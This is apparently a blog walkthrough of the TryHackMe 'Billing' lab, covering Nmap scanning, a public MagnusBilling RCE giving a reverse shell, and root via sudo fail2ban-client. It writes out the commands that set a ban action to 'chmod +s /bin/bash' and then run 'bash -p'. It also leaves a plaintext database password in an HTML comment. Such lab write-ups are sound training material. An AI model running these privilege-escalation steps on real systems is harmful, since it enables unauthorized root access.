---
# the default layout is 'page'
icon: fas fa-info-circle
order: 4
tags: RCE fail2ban 
categories: Tryhackme
image: https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1741192887584
---

ðŸ‘‹ Greetings, fellow cybersecurity enthusiasts,

As part of my ongoing preparation for the TryHackMe PT1 exam, Iâ€™ve just completed another room in the series: Billing.

In this walkthrough, I document the enumeration, exploitation, privilege escalation, and flag capture steps taken during the engagement. The aim is to reinforce key penetration testing concepts while also sharing insights that can help others preparing for the PT1 exam.

ðŸ“˜ Follow along as we continue building knowledge, sharpening skills, and moving one step closer to certification success.

## Enumeration

An initial TCP port scan was conducted against the target billing.thm (10.10.207.112) using Nmap with the following parameters: ports 22, 80, 3306, default scripts (-sC), service/version detection (-sV), TCP connect scan (-sT), and aggressive timing (-T4)

These were the results:
```php
                                                                                                                                       î‚² 1 âœ˜ 
# Nmap 7.95 scan initiated Tue Mar 11 10:03:19 2025 as: /usr/lib/nmap/nmap --privileged --min-rate=10000 -p 22,80,3306 -sC -sV -sT -T4 -Pn -oA nmap_output/20250311_100319_tcp_ports billing.thm
Nmap scan report for billing.thm (10.10.207.112)
Host is up (0.40s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was http://billing.thm/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 11 10:03:36 2025 -- 1 IP address (1 host up) scanned in 17.00 seconds
```

### Web Enumeration

The HTTP service revealed a web application landing page for MagnusBilling. As no valid credentials were available, further research was conducted to identify potential exploits

![image.png](assets/screenshots/Billing/1.png)

A GitHub repository was found that provides a direct Remote Code Execution (RCE) vulnerability for this application.

![image.png](assets/screenshots/Billing/2.png)

Using the instructions from the GitHub repository, the Remote Code Execution (RCE) vulnerability in the MagnusBilling application was successfully leveraged. This allowed for the execution of arbitrary commands on the target system.

Following the exploit procedure, a reverse shell was obtained, providing access to the target machine:

![image.png](assets/screenshots/Billing/3.png)

## User Flag

After gaining a reverse shell on the target system, the next step was to locate the user flag. Typical locations for user flags are within the home directories of users.

On inspection, the user flag was found at the home directory of the user `magnus`:

![image.png](assets/screenshots/Billing/4.png)


<!-- asterisk@ip-10-10-17-92:/var/www/html/mbilling/protected/config$ cat /etc/asterisk/res_config_mysql.conf
<ted/config$ cat /etc/asterisk/res_config_mysql.conf             
[general]
dbhost = 127.0.0.1
dbname = mbilling
dbuser = mbillingUser
dbpass = BLOGYwvtJkI7uaX5
 -->


While enumerating the target after gaining a reverse shell, a potentially sensitive file was discovered:
```php
/var/www/html/mbilling/protected/config/main_production.php
```
![image.png](assets/screenshots/Billing/5.png)


This file contained important configuration details, including a reference to another configuration file with database credentials. Access to these credentials could allow direct interaction with the underlying **MariaDB** service, potentially exposing sensitive information such as application data, user accounts, and hashes.

This discovery indicated a clear path for lateral movement and privilege escalation through database exploitation.

![image.png](assets/screenshots/Billing/6.png)

I had to check if there was a mysql service running, and yes it was running and allows connection 

![image.png](assets/screenshots/Billing/7.png)


# Privilege Escalation

During post-exploitation enumeration, it was identified that **Fail2ban** was installed and actively running on the target system.  
Fail2ban monitors authentication logs and executes predefined actions (e.g., banning IPs, running scripts) when certain patterns are triggered.  

Upon further inspection, it was discovered that the Fail2ban configuration referenced an **action script** that was writable by the current user. This misconfiguration allowed modification of the script, enabling command execution with elevated privileges when Fail2ban triggered a ban event.

The syntax
```php
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
```

```php
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 10.23.26.210 
```

```php
ls -lna /bin/bash
```

```php
bash -p  
```


![image.png](assets/screenshots/Billing/8.png)

From there go get the root flag ðŸ˜ŽðŸ˜Ž

![image.png](assets/screenshots/Billing/9.png)


Looking for me?? 

![image.png](assets/screenshots/Billing/10.png)

Basically ...: Dont forget I have trust issues

Till next time

#OperationFireball #KillTheLimits #Sniper #SerialKiller #RedTeam #Pentesting #ActiveDirectory #PT1
